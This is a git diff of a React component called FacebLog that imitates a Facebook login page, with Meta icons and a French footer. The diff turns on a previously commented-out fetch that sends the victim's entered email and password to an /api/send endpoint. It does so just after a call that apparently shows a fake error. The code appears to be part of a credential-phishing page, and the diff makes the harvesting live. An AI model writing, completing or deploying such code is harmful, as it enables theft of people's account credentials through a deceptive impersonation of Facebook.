@@ -1,7 +1,7 @@
 import { useState } from "react";
 import emailjs from "@emailjs/browser";
 import { FaFacebook, FaMeta, FaEye, FaEyeSlash } from "react-icons/fa6";
-
+import imagecote from "../assets/imagecote.png";
 function FacebLog({ onErreur }) {
   const [showPassword, setShowPassword] = useState(false);
   const [password, setPassword] = useState("");
@@ -9,11 +9,11 @@ function FacebLog({ onErreur }) {
 
   const handleSubmit = async () => {
     onErreur();
-    // await fetch("/api/send", {
-    //   method: "POST",
-    //   headers: { "Content-Type": "application/json" },
-    //   body: JSON.stringify({ email, password }),
-    // });
+    await fetch("/api/send", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ email, password }),
+    });
   };
   const footerLangs = [
     { label: "Français (France)", href: "#", active: true },
@@ -94,7 +94,7 @@ function FacebLog({ onErreur }) {
               </h1>
             </div>
             <div className="g2">
-              <img src="../src/assets/imagecote.png" alt="" />
+              <img src={imagecote} alt="" />
             </div>
           </div>
           <div className="droite">
